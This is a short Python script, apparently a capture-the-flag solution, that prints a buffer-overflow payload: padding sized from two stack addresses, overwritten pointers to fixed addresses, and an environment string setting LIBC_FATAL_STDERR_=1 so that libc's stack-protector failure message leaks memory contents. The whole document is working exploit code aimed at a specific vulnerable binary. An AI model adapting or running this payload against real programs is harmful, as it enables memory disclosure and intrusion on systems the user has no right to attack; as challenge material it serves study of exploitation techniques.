import sys

payload = ''

payload += 'a'*(0x00007fffffffea28 - 0x00007fffffffe810)
payload += '\x20\x0d\x40\x00' + '\x00'*4 # 0x400d20
payload += 'dummystr'
payload += '\x20\x0d\x60\x00' + '\x00'*4 # 0x600d20
payload += '\n'

payload += 'LIBC_FATAL_STDERR_=1\n' # for getc

sys.stdout.write(payload)
